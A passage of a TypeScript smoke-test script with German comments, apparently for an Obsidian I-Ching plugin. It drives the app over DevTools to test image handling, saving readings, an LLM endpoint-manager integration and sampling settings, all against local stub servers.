    `zweites Bild ${zweites ?? "—"} · erstes (${erstesBild}) ${ersteWeg ? "entfernt" : "liegt noch im Vault"}`,
  );
  if (!zweites) return;

  // D8 — der Anbieter liefert den Fehlerwert: Meldung mit dem Grund, das vorhandene Bild bleibt.
  await ligSlot(cdp, "fake-fehler");
  await clickPanelButton(cdp, ".yijing-artwork .yijing-actions button");
  const fehlermeldung = await pollUntil<string>(cdp, `const t = [...document.querySelectorAll(".notice")].map((n) => n.textContent || "").find((x) => x.includes("generation already running")); return t ?? null;`, 6000, 200);
  await schlaf(500);
  const bleibt = await vorschauDatei(cdp);
  record(
    "D8 Fehlerwert des Anbieters: Meldung mit dem Grund, das Bild bleibt",
    fehlermeldung !== null && bleibt.pfad === zweites,
    `Meldung ${JSON.stringify(fehlermeldung?.slice(0, 80) ?? null)} · Vorschau zeigt ${bleibt.pfad ?? "kein Bild"} (erwartet ${zweites})`,
  );
  await ligSlot(cdp, "fake-ok");

  // D9 — ein neuer Wurf raeumt das ungespeicherte Bild weg.
  await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
  await schlaf(1000);
  const zweitesWeg = await cdp.evaluate<boolean>(`return app.vault.getAbstractFileByPath(${JSON.stringify(zweites)}) === null;`);
  record("D9 Neuer Wurf raeumt ein ungespeichertes Bild weg", zweitesWeg, `${zweites} ${zweitesWeg ? "entfernt" : "liegt noch im Vault"}`);
}

/** E — Speichern mit Bild. Legt eine Notiz im Staging-Vault an; Note und Bild wandern am Ende in den Papierkorb. */
async function abschnittSpeichern(cdp: Cdp, aufraeumen: string[]): Promise<void> {
  console.log("\n── E · Reading speichern ──");

  // Ein frisches Bild fuer diesen Wurf (D9 hat das vorige mit dem Wurf weggeraeumt).
  await clickPanelButton(cdp, ".yijing-artwork .yijing-actions button");
  const bild = await pollUntil<string>(cdp, `
    const i = document.querySelector(".yijing-artwork-img");
    if (!i) return null;
    const f = app.vault.getFiles().filter((x) => x.extension === "png" && i.src.includes(encodeURI(x.path).replace(/%2F/g, "/"))).map((x) => x.path);
    return f[0] ?? null;`, 8000, 200);
  if (bild) aufraeumen.push(bild);
  const pngVorher = await cdp.evaluate<number>(`return app.vault.getFiles().filter((f) => f.extension === "png").length;`);
  const vorher = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
  // Die zweite Aktionsreihe unter der Weissagung traegt "Speichern".
  // Nicht ueber nth-of-type: das zaehlt alle <div> unter der Wurzel, und die Modellzeile unter dem Titel verschiebt sie.
  const geklickt = await cdp.evaluate<boolean>(`
    const b = document.querySelectorAll(".yijing-oracle > .yijing-actions")[1]?.querySelector("button");
    if (!b) return false;
    b.click();
    await new Promise((r) => setTimeout(r, 400));
    return true;`);
  await schlaf(1500);

  const neu = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
  const entstanden = neu.filter((p) => !vorher.includes(p));
  record(
    "E1 Speichern legt genau eine Notiz an",
    geklickt && entstanden.length === 1,
    entstanden.length ? entstanden.join(", ") : "keine neue Notiz",
  );
  if (entstanden.length !== 1) return;
  aufraeumen.push(entstanden[0]);

  const inhalt = await cdp.evaluate<{ laenge: number; bild: string | null }>(`
    const f = app.vault.getAbstractFileByPath(${JSON.stringify(entstanden[0])});
    const text = await app.vault.read(f);
    const m = text.match(/!\\[\\[([^\\]]+\\.png)\\]\\]/);
    return { laenge: text.length, bild: m ? m[1] : null };
  `);
  record("E2 Notiz traegt den Reading-Text", inhalt.laenge > 500, `${inhalt.laenge} Zeichen`);

  const ziel = inhalt.bild
    ? await cdp.evaluate<string | null>(`
        const f = app.metadataCache.getFirstLinkpathDest(${JSON.stringify(inhalt.bild)}, ${JSON.stringify(entstanden[0])});
        return f ? f.path : null;`)
    : null;
  const pngNachher = await cdp.evaluate<number>(`return app.vault.getFiles().filter((f) => f.extension === "png").length;`);
  record(
    "E3 Die Note bettet die vorhandene Bilddatei ein, es entsteht keine Kopie",
    bild !== null && ziel === bild && pngNachher === pngVorher,
    `Einbettung ${JSON.stringify(inhalt.bild)} → ${ziel ?? "keine Datei"} (Bild des Panels: ${bild ?? "keins"}) · PNG im Vault vorher ${pngVorher}, nachher ${pngNachher}`,
  );

  // E4 — die Note besitzt das Bild jetzt: ein neuer Wurf raeumt es nicht weg.
  await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
  await schlaf(1000);
  const bleibt = bild !== null && (await cdp.evaluate<boolean>(`return app.vault.getAbstractFileByPath(${JSON.stringify(bild)}) !== null;`));
  record("E4 Das gespeicherte Bild bleibt nach einem neuen Wurf", bleibt, bild === null ? "kein Bild zum Speichern" : `${bild} ${bleibt ? "liegt noch im Vault" : "wurde weggeraeumt"}`);
}

// --- M · LLM Endpoint Manager (optionale Fremd-Quelle) ------------------------------
// uebernommen aus lingotuner/scripts/gui-smoke.ts (Commits 2d32e53, 1899b68, 66bd0be),
// 2026-09-16 — Selektoren und Aufruf-Konstrukte auf yijing-oracle zugeschnitten
// (.yijing-oracle-Panel statt .lt-*, resolveLlmEndpoint()/generateInterpretation() statt
// tune(), M2b prueft ueber settings.llm.choice statt settings.choice).

const MANAGER_PLUGIN_ID = "llm-endpoint-manager";
const MANAGER_DEFAULT_MODEL = "smoke-manager-model";
const LOCAL_FALLBACK_MODEL = "smoke-lokal-modell";

interface FakeChatEndpoint { url: string; close: () => Promise<void>; chatCalls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null; lastAuth: () => string | null; pixelCalls: () => number }

/** Duenne Huelle ueber den zentralen LLM-Stub (`tools/obsidian-cdp/llm-stub.ts`) statt eines eigenen Mini-Servers —
 *  M1-M3 pruefen die KONSUMENTEN-Seite (resolveLlmEndpoint()/findEndpointManager() in view.ts), nicht den Manager
 *  selbst. `/pixel` (V7/V8: ein Fernbild, das die Notiz von selbst laedt, landet hier, der Zaehler misst am Draht)
 *  ist eine Zusatzroute des Stubs. */
async function startFakeChatEndpoint(modelId: string, antwort?: (body: Record<string, unknown>) => string): Promise<FakeChatEndpoint> {
  const stub = await startLlmStub({
    models: [modelId],
    standard: { text: "ok", model: modelId },
    antwort: antwort
      ? (anfrage) => {
          const body = anfrage.json as Record<string, unknown> | null;
          return body ? { text: antwort(body), model: modelId } : undefined;
        }
      : undefined,
    zusatz: { "GET /pixel": () => ({ body: Buffer.from(PIXEL_GIF, "base64"), contentType: "image/gif" }) },
  });
  const letzteChat = () => stub.letzte("chat");
  return {
    url: stub.url,
    close: () => stub.stop(),
    chatCalls: () => stub.zaehler().chat,
    lastModel: () => ((letzteChat()?.json as { model?: string } | null)?.model) ?? null,
    lastBody: () => (letzteChat()?.json as Record<string, unknown> | null) ?? null,
    lastAuth: () => { const h = letzteChat()?.header.authorization; return typeof h === "string" ? h : null; },
    pixelCalls: () => stub.zaehler().zusatz,
  };
}

const PIXEL_GIF = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

/** Fake `llm-endpoint-manager` (Plugin-API v1) aus der zentralen Brücke. `configModel: "default"`: `config.model` ist
 *  gesetzt, weil der ECHTE Manager beides setzt — ohne das Feld würde ein Fehler wie lingotuners C1 (config.model
 *  überschreibt eine getroffene Modellwahl) hier nicht reproduziert. Die Brücke sichert einen vorgefundenen Eintrag
 *  im Renderer und stellt ihn beim Abbau identisch wieder her. */
async function installFakeManager(cdp: Cdp, url: string): Promise<void> {
  await installZentralFakeManager(cdp, {
    pluginId: MANAGER_PLUGIN_ID,
    endpunkte: [{ id: "fake-mgr-ep", label: "Fake Manager Endpoint", url, models: [MANAGER_DEFAULT_MODEL], defaultModel: MANAGER_DEFAULT_MODEL, configModel: "default" }],
  });
}

/** Stellt den VOR `installFakeManager()` vorgefundenen Eintrag wieder her; ohne Sicherung löscht die Brücke nur,
 *  was selbst ein Fake ist. */
async function removeFakeManager(cdp: Cdp): Promise<void> {
  await entferneFakeManager(cdp, { pluginId: MANAGER_PLUGIN_ID });
}

const MANAGED_TEXT = ["Endpunkte kommen vom LLM Endpoint Manager", "Endpoints come from the LLM Endpoint Manager"];

/** Ein Wurf + Deutungslauf: braucht das offene Panel, wirft neu (das Ergebnis selbst ist fuer
 *  M irrelevant) und klickt danach den Deuten-Knopf — der ist der einzige Knopf in
 *  `.yijing-interpretation-inner .yijing-actions`, solange keine Deutung vorliegt. */
/** Textlaenge der Deutung beim Ende von `laufeDeutung` (vor einem Abbruch gemessen). */
let letzteDeutungLaenge = 0;
/** Die ersten Zeichen der zuletzt beobachteten Deutung (nur fuer das Detail von M4: faengt der Text mit Denktext an?). */
let letzteDeutungAnfang = "";

async function laufeDeutung(cdp: Cdp, wartenMs = 15000, frage = "Smoke M: Endpunkt-Manager", genugZeichen = 0): Promise<boolean> {
  const offen = await openPanel(cdp);
  if (!offen) return false;
  await cdp.evaluate(`
    const q = document.querySelector(".yijing-oracle .yijing-question");
    if (q) { q.value = ${JSON.stringify(frage)}; q.dispatchEvent(new Event("input")); }
    return true;
  `);
  const geworfen = await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
  if (!geworfen) return false;
  await schlaf(500);
  const geklickt = await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
  if (!geklickt) return false;
  // `genugZeichen` > 0: auch ein noch laufender Stream mit so viel Text zaehlt (und wird danach abgebrochen).
  // Ein echtes Modell kann ohne Token-Grenze minutenlang weiterschreiben — fuer „streamt“ genuegt der Beleg.
  const fertig = await pollUntil<boolean>(
    cdp,
    `const body = document.querySelector(".yijing-interpretation-body");
     const tail = document.querySelector(".okit-stream-tail");
     // Ein Modell, das sein Denken in den Antworttext schreibt (gemma4 ohne Öffner), zeigt es bis zum Kanal-Ende als Antwort:
     // so lange der Text so anfängt und der Denkblock leer ist, ist es noch Denken und zählt nicht als Deutung.
     const denktText = tail && /^\\s*(Thinking Process|Thought Process|The user wants)/i.test(tail.textContent || "")
       && !((document.querySelector(".okit-stream-reasoning pre") || { textContent: "" }).textContent || "").trim();
     return (Boolean(body && body.textContent && body.textContent.trim().length > 0)
       || (${genugZeichen} > 0 && !denktText && Boolean(tail && tail.textContent && tail.textContent.length >= ${genugZeichen}))) ? true : null;`,
    wartenMs,
    300,
  );
  if (fertig) {
    // Laenge VOR einem Abbruch merken (danach ist die Deutung weg). Noch im Stream und genug Text? Dann
    // Abbrechen klicken (der einzige Knopf in .yijing-actions, solange gestreamt wird).
    letzteDeutungAnfang = await cdp.evaluate<string>(`return ((document.querySelector(".yijing-interpretation-body")?.textContent ?? "").trim() || (document.querySelector(".okit-stream-tail")?.textContent ?? "")).replace(/\\s+/g, " ").slice(0, 80);`);
    letzteDeutungLaenge = await cdp.evaluate<number>(`return Math.max((document.querySelector(".yijing-interpretation-body")?.textContent ?? "").trim().length, (document.querySelector(".okit-stream-tail")?.textContent ?? "").length);`);
    if (genugZeichen > 0) {
      await cdp.evaluate(`if (document.querySelector(".okit-stream-tail")) document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`);
    }
  }
  return Boolean(fertig);
}

/** M1b — der Fall, den M1 NICHT trifft (Cockpit-Task „Settings-Tab zeigt neu installierten LLM Endpoint Manager nicht sofort“):
 *  der Tab ist schon einmal gezeichnet und gecacht, DANACH installiert sich der Manager, und der Nutzer kommt von einem
 *  ANDEREN Tab zurueck. Schliessen und Wiederoeffnen (M1) reproduziert den Fehler nicht — `hide()` ruft dort `update()`;
 *  `openTab()` ruft `hide()` aber nur auf dem VERLASSENEN Tab, und `renderTab()` des neu aktiven zeichnet bei
 *  unveraenderter `settingItems.length` nicht neu (Kit `installTabRefreshOnOpen`, gemessen 1.14.2). */
async function pruefeTabWechsel(cdp: Cdp, port: number): Promise<void> {
  console.log("\nM1b · Manager erst nach dem gecachten Tab installiert, Rueckkehr per Tab-Wechsel");
  const name = "M1b Manager erst nach dem ersten Oeffnen des Tabs installiert: die Settings zeigen ihn nach einem Tab-Wechsel";
  let fake: FakeChatEndpoint | null = null;
  let ui: SettingsUi | null = null;
  try {
    await removeFakeManager(cdp);
    // Vorbedingung: Tab zeichnet die LOKALE Liste (ohne Manager) — sonst ist der Fall nicht hergestellt.
    ui = await openSettingsTab(cdp, port);
    if (!ui) { unmeasured(name, "Settings-Oberflaeche nicht gefunden"); return; }
    const vorher = await pollUntil<number>(ui.cdp, `const n = (${wurzelAusdruck(ui)}).querySelectorAll(".okit-ep-status").length; return n > 0 ? n : null;`, 6000, 250);
    if (!vorher) { unmeasured(name, "Vorbedingung nicht hergestellt: die lokale Endpunkt-Liste erschien nicht"); return; }

    // Auf einen anderen Tab wechseln (verlaesst unseren Tab: hide() laeuft dort), dann den Manager installieren.
    await cdp.evaluate(`app.setting.openTabById("appearance"); await new Promise((r) => setTimeout(r, 600)); return app.setting.activeTab?.id ?? null;`);
    fake = await startFakeChatEndpoint(MANAGER_DEFAULT_MODEL);
    await installFakeManager(cdp, fake.url);

    // Zurueck zu unserem Tab: der Host ruft nur renderTab() auf dem neu aktiven Tab.
    const aktiv = await cdp.evaluate<string | null>(`app.setting.openTabById(${JSON.stringify(PLUGIN_ID)}); await new Promise((r) => setTimeout(r, 800)); return app.setting.activeTab?.id ?? null;`);
    const body = (await pollUntil<string>(ui.cdp, `const t = (${wurzelAusdruck(ui)}).textContent || ""; return t.length > 200 && ${JSON.stringify(MANAGED_TEXT)}.some((m) => t.includes(m)) ? t : null;`, 6000, 250))
      ?? await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
    const managed = MANAGED_TEXT.some((x) => body.includes(x));
    const lokal = await zeilenZahlSelector(ui, ".okit-ep-status");
    record(name, aktiv === PLUGIN_ID && managed && lokal === 0,
      `aktiver Tab ${JSON.stringify(aktiv)}, vorher ${vorher} lokale Zeile(n), jetzt managed-Text ${managed ? "da" : "fehlt"} und ${lokal} lokale Zeile(n)`);
  } catch (e) {
    if (!aufgezeichnet(name)) unmeasured(name, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (ui) await closeSettings(cdp, ui);
    await removeFakeManager(cdp).catch(() => null);
    if (fake) await fake.close().catch(() => undefined);
  }
}

/** M1-M3 (+M2b): Manager an → Settings zeigen den Baustein statt der lokalen Liste, ein Lauf
 *  geht an den Manager-Endpunkt mit dem korrekten Modell; eine Modellwahl gegenueber dem
 *  Manager gewinnt gegen dessen Default (M2b, Regression aus lingotuner C1); Manager aus →
 *  beides faellt auf lokal zurueck. Ein einziger aeusserer try/finally raeumt Fake-Server und
 *  injizierte API auf, egal wo es abbricht. */
async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
  console.log("\nM · LLM Endpoint Manager (optionale Fremd-Quelle)");
  let fake: FakeChatEndpoint | null = null;
  let localFake: FakeChatEndpoint | null = null;
  let ui: SettingsUi | null = null;
  let vorherEndpoints: unknown = null;
  const NAMEN = [
    "M1 Settings zeigen den Manager statt der lokalen Liste",
    "M2 Lauf nutzt den Manager-Endpunkt und das Default-Modell",
    "M2b Manager-Lauf nutzt gewaehltes Modell, nicht den Endpunkt-Default (C1)",
    "M3 Manager aus → lokale Liste in Settings und im Lauf",
  ];
  try {
    fake = await startFakeChatEndpoint(MANAGER_DEFAULT_MODEL);
    console.log(`  Fake-Manager-Endpunkt: ${fake.url}`);
    await installFakeManager(cdp, fake.url);

    // M1 — Settings zeigen den Manager-Baustein (managed-Text), keine .okit-ep-status-Zeile
    // (der Marker des lokalen Listen-Editors).
    ui = await openSettingsTab(cdp, port);
    if (!ui) { for (const n of NAMEN) unmeasured(n, "Settings-Oberflaeche nicht gefunden"); return; }
    // Erst warten, bis der Tab gezeichnet ist (das frische Fenster ist beim Anhaengen noch leer), und
    // dem Kit-Baustein Zeit fuer sein asynchrones Neuzeichnen nach der Aufloesung geben — gemessen wird
    // der Zustand danach, nicht der erste Anstrich.
    const body = (await pollUntil<string>(ui.cdp, `const t = (${wurzelAusdruck(ui)}).textContent || ""; return t.length > 200 && ${JSON.stringify(MANAGED_TEXT)}.some((m) => t.includes(m)) ? t : null;`, 6000, 250))
      ?? await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
    const managed = MANAGED_TEXT.some((s) => body.includes(s));
    const localRows = await zeilenZahlSelector(ui, ".okit-ep-status");
    const auszug = managed ? "" : ` · Tab-Text rund um „KI“: ${JSON.stringify(body.slice(Math.max(0, body.search(/KI-Deutung|AI interpretation|LLM/i)), Math.max(0, body.search(/KI-Deutung|AI interpretation|LLM/i)) + 220))} (Laenge ${body.length})`;
    record(NAMEN[0]!, managed && localRows === 0, `managed-Text ${managed ? "da" : "fehlt"}, ${localRows} lokale Endpunkt-Zeilen${auszug}`);
    await closeSettings(cdp, ui);
    ui = null;

    // M2 — ein Lauf nutzt den Manager-Endpunkt und das Default-Modell (kein choice.model
    // gesetzt → modelOf() faellt auf defaultModel).
    const okM2 = await laufeDeutung(cdp);
    const callsM2 = fake.chatCalls();
    const modellM2 = fake.lastModel();
    record(NAMEN[1]!, okM2 && callsM2 > 0 && modellM2 === MANAGER_DEFAULT_MODEL,
      okM2 ? `Fake-Server sah ${callsM2} POST /v1/chat/completions, Modell ${JSON.stringify(modellM2)} (erwartet ${JSON.stringify(MANAGER_DEFAULT_MODEL)})`
           : "Deutungslauf lieferte kein Ergebnis");

    // M2b — Regression C1: eine im Panel/Settings getroffene Modellwahl (settings.llm.choice)
    // darf NICHT vom Endpunkt-Default ueberschrieben werden. resolveLlmEndpoint() liest
    // choice.model bereits mit hoechster Prioritaet (src/vendor/kit/endpoint-source.ts
    // modelOf()) — dieser Punkt beweist es gegen den Fake-Server, nicht nur am Code.
    const gewaehltesModell = `${MANAGER_DEFAULT_MODEL}-CHOICE`;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llm.choice = { ...(p.settings.llm.choice ?? {}), model: ${JSON.stringify(gewaehltesModell)} };
      p.llm.invalidate(); await p.saveSettings();
      return { ok: true };
    `);
    const okM2b = await laufeDeutung(cdp);
    const modellM2b = fake.lastModel();
    record(NAMEN[2]!, okM2b && modellM2b === gewaehltesModell,
      okM2b ? `Fake-Server sah Modell ${JSON.stringify(modellM2b)}, erwartet ${JSON.stringify(gewaehltesModell)}`
            : "Deutungslauf lieferte kein Ergebnis");
    // choice zuruecksetzen: sonst liest M3s LOKALER Lauf denselben choice.model.
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return { ok: true };
    `);

    // M3 — Manager "deaktivieren" (Analog zu disablePlugin) → Settings fallen auf die lokale
    // Liste zurueck, ein Lauf nutzt wieder den lokalen Fake-Endpunkt (BRAUCHT einen echten
    // Server, sonst "nichts gemessen" statt still gruen).
    await removeFakeManager(cdp);
    ui = await openSettingsTab(cdp, port);
    if (!ui) { unmeasured(NAMEN[3]!, "Settings-Oberflaeche nach Manager-Entfernung nicht gefunden"); return; }
    const bodyNach = (await pollUntil<string>(ui.cdp, `const t = (${wurzelAusdruck(ui)}).textContent || ""; return t.length > 200 && !${JSON.stringify(MANAGED_TEXT)}.some((m) => t.includes(m)) ? t : null;`, 6000, 250))
      ?? await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
    const managedNach = MANAGED_TEXT.some((s) => bodyNach.includes(s));
    const localRowsNach = await zeilenZahlSelector(ui, ".okit-ep-status");
    await closeSettings(cdp, ui);
    ui = null;
    const settingsZurueck = !managedNach && localRowsNach > 0;

    localFake = await startFakeChatEndpoint(LOCAL_FALLBACK_MODEL);
    console.log(`  Fake-Lokal-Endpunkt: ${localFake.url}`);
    vorherEndpoints = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm.endpoints };`)).eps;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(localFake.url)} }];
      p.llm.invalidate(); await p.saveSettings();
      return { ok: true };
    `);
    const okLokal = await laufeDeutung(cdp);
    const lokaleCalls = localFake.chatCalls();
    const modellLokal = localFake.lastModel();
    record(NAMEN[3]!, settingsZurueck && okLokal && lokaleCalls > 0,
      `managed-Text ${managedNach ? "noch da" : "weg"}, ${localRowsNach} lokale Zeilen, lokaler Lauf ${okLokal ? "ok" : "fehlgeschlagen"} (${lokaleCalls} POST /v1/chat/completions, Modell ${JSON.stringify(modellLokal)})`);
  } catch (e) {
    for (const n of NAMEN) {
      if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
    }
  } finally {
    if (ui) await closeSettings(cdp, ui);
    await removeFakeManager(cdp).catch(() => null);
    if (fake) await fake.close().catch(() => undefined);
    if (localFake) await localFake.close().catch(() => undefined);
    if (vorherEndpoints !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.llm.endpoints = ${JSON.stringify(vorherEndpoints)};
        p.llm.invalidate(); await p.saveSettings();
        return { ok: true };
      `).catch(() => null);
    }
  }
}

/** N1-N6: Sampling-Profile (Modus creative, Abschnitt „Anfrage“). Gegen einen Fake-Endpunkt mit
 *  Qwen-Modellnamen (Familie wird aus dem Namen erkannt), lokaler Pfad ohne Manager. Die Werte
 *  stehen NICHT hier, sondern an der Quelle: Temperatur 0.7 und Denkstufe medium sind die
 *  Modus-Defaults aus `code-kit` sampling-profiles (MODES.creative) — der Body-Punkt N3 misst
 *  den tatsaechlich GESENDETEN Body, nicht die Anzeige. Zwei Bearbeitungen hintereinander (N2),
 *  weil ein Einklappen nach der ersten im Pilot nur so sichtbar wurde (Nachtrag 6). */
const ANFRAGE_MODELL = "qwen/qwen3.6-35b-a3b";

async function pruefeAnfrage(cdp: Cdp, port: number): Promise<void> {
  console.log("\nN · Sampling-Profile (Abschnitt „Anfrage“, Modus creative)");
  const NAMEN = [
    "N1 Abschnitt „Anfrage“ klappt auf und zeigt die Felder des Modus",
    "N2 Zwei Bearbeitungen hintereinander (Temperatur, Denkstufe) speichern und lassen den Abschnitt offen",
    "N3 Gesendeter Body traegt die Modus-Defaults (Temperatur 0.7, Denkstufe medium)",
    "N4 Gesendeter Body folgt den Einstellungen (Ueberschreibung 0.9, Denken aus → reasoning_effort none)",
    "N5 Zuruecksetzen entfernt die Ueberschreibung und laesst den Abschnitt offen",
    "N6 „Letzte Anfrage“ zeigt beim Oeffnen des Tabs den gesendeten Body",
  ];
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  let fake: FakeChatEndpoint | null = null;
  let ui: SettingsUi | null = null;
  let vorher: unknown = null;
  try {
    await removeFakeManager(cdp);
    fake = await startFakeChatEndpoint(ANFRAGE_MODELL);
    console.log(`  Fake-Endpunkt: ${fake.url} (Modell ${ANFRAGE_MODELL})`);
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null, request: ${P}.settings.request };`);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)}, model: ${JSON.stringify(ANFRAGE_MODELL)} }]; p.settings.llm.choice = {};
      p.settings.request = { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false };
      p.llm.invalidate(); await p.saveSettings();
      return true;`);

    // N3 — Lauf mit Modus-Defaults, Body am Fake-Server gemessen.
    const ok1 = await laufeDeutung(cdp);
    const body1 = fake.lastBody();
    record(NAMEN[2]!, ok1 && body1?.temperature === 0.7 && body1?.reasoning_effort === "medium",
      ok1 ? `Body: temperature=${JSON.stringify(body1?.temperature)}, reasoning_effort=${JSON.stringify(body1?.reasoning_effort)}, Modell ${JSON.stringify(body1?.model)}` : "Deutungslauf lieferte kein Ergebnis");

    // N1 — Tab oeffnen, Abschnitt aufklappen. `.okit-collapsible-header` ist hier die EINZIGE
    // einklappbare Sektion (die Einstellungs-Gruppen sind nicht einklappbar).
    ui = await openSettingsTab(cdp, port);
    if (!ui) { for (const n of NAMEN.filter((_, i) => i !== 2)) unmeasured(n, "Settings-Oberflaeche nicht gefunden"); return; }
    const w = wurzelAusdruck(ui);
    const vorKlick = await ui.cdp.evaluate<string | null>(`return (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded") ?? null;`);
    await ui.cdp.evaluate(`(${w}).querySelector(".okit-collapsible-header")?.click(); return true;`);
    const felder = await pollUntil<number>(ui.cdp, `const n = (${w}).querySelectorAll('.okit-collapsible-body input[data-field]').length; return n > 0 ? n : null;`, 4000, 200);
    const nachKlick = await ui.cdp.evaluate<string | null>(`return (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded") ?? null;`);
    record(NAMEN[0]!, vorKlick === "false" && nachKlick === "true" && (felder ?? 0) >= 2,
      `aria-expanded ${String(vorKlick)} → ${String(nachKlick)}, ${String(felder)} Eingabefelder`);

    // N6 — „Letzte Anfrage“ stammt aus dem Lauf N3 und steht beim Oeffnen schon da.
    const letzte = await ui.cdp.evaluate<string>(`return (${w}).querySelector(".okit-request-last")?.textContent ?? "";`);
    record(NAMEN[5]!, letzte.includes('"temperature": 0.7') && letzte.includes('"reasoning_effort": "medium"'),
      letzte ? `Anzeige: ${letzte.replace(/\s+/g, " ").slice(0, 120)}` : "kein .okit-request-last im Tab");

    // N2 — Bearbeitung 1: Temperatur 0.9 (Blur speichert), Bearbeitung 2: Denkstufe aus.
    await ui.cdp.evaluate(`
      const i = (${w}).querySelector('input[data-field="temperature"]');
      i.value = "0.9"; i.dispatchEvent(new Event("input", { bubbles: true })); i.dispatchEvent(new Event("blur"));
      return true;`);
    const ov = await pollUntil<boolean>(cdp, `return ${P}.settings.request.overrides?.creative?.["qwen3.6"]?.temperature === 0.9 ? true : null;`, 4000, 200);
    const offen1 = await pollUntil<string>(ui.cdp, `const a = (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    await ui.cdp.evaluate(`
      const sel = [...(${w}).querySelectorAll(".okit-collapsible-body select")].find((s) => [...s.options].some((o) => o.value === "off"));
      sel.value = "off"; sel.dispatchEvent(new Event("change", { bubbles: true }));
      return true;`);
    const stufe = await pollUntil<boolean>(cdp, `return ${P}.settings.request.thinking?.creative === "off" ? true : null;`, 4000, 200);
    const offen2 = await pollUntil<string>(ui.cdp, `const a = (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    record(NAMEN[1]!, ov === true && offen1 === "true" && stufe === true && offen2 === "true",
      `Ueberschreibung ${ov ? "gespeichert" : "fehlt"}, Stufe ${stufe ? "off" : "nicht gesetzt"}, Abschnitt nach Bearbeitung 1: ${String(offen1 ?? "zu")}, nach 2: ${String(offen2 ?? "zu")}`);
    await closeSettings(cdp, ui);
    ui = null;

    // N4 — zweiter Lauf: der Body folgt den Einstellungen.
    const ok2 = await laufeDeutung(cdp);
    const body2 = fake.lastBody();
    record(NAMEN[3]!, ok2 && body2?.temperature === 0.9 && body2?.reasoning_effort === "none",
      ok2 ? `Body: temperature=${JSON.stringify(body2?.temperature)}, reasoning_effort=${JSON.stringify(body2?.reasoning_effort)}` : "Deutungslauf lieferte kein Ergebnis");

    // N5 — Zuruecksetzen der Temperatur ueber den Knopf der Zeile.
    ui = await openSettingsTab(cdp, port);
    if (!ui) { unmeasured(NAMEN[4]!, "Settings-Oberflaeche nicht gefunden"); return; }
    const w2 = wurzelAusdruck(ui);
    await ui.cdp.evaluate(`
      const zeile = (${w2}).querySelector('input[data-field="temperature"]')?.closest(".setting-item");
      zeile?.querySelector(".extra-setting-button")?.click();
      return true;`);
    const weg = await pollUntil<boolean>(cdp, `const t = ${P}.settings.request.overrides?.creative?.["qwen3.6"]?.temperature; return t === undefined ? true : null;`, 4000, 200);
    const offen3 = await pollUntil<string>(ui.cdp, `const a = (${w2}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    record(NAMEN[4]!, weg === true && offen3 === "true", `Ueberschreibung ${weg ? "entfernt" : "noch da"}, Abschnitt ${offen3 === "true" ? "offen" : "zugeklappt"}`);
  } catch (e) {
    for (const n of NAMEN) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (ui) await closeSettings(cdp, ui);
    if (fake) await fake.close().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.settings.request = v.request;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** Z — die Modellzeile (Kit `buildModelBar`) unter dem Titel des Panels, Aufgabe „Deutung“. Gegen einen Stub mit drei Modellen; Z-d2 braucht
 *  eine verzoegerte Aufloesung (der Stub verzoegert nur Chat-Antworten): ein kleiner TCP-Vorsatz haelt jede Anfrage `ms` zurueck, auch auf einer wiederverwendeten Verbindung. */
async function verzoegernderVorsatz(ziel: number, ms: number): Promise<{ port: number; close: () => Promise<void> }> {
  const sockets = new Set<import("node:net").Socket>();
  const server: Server = createServer((client) => {
    const hinten = connect(ziel, "127.0.0.1");
    sockets.add(client);
    sockets.add(hinten);
    // Jedes Stueck des Clients (auch auf einer wiederverwendeten Verbindung) kommt `ms` spaeter beim Stub an, in gleicher Reihenfolge.
    client.on("data", (d) => { setTimeout(() => { if (!hinten.destroyed) hinten.write(d); }, ms); });
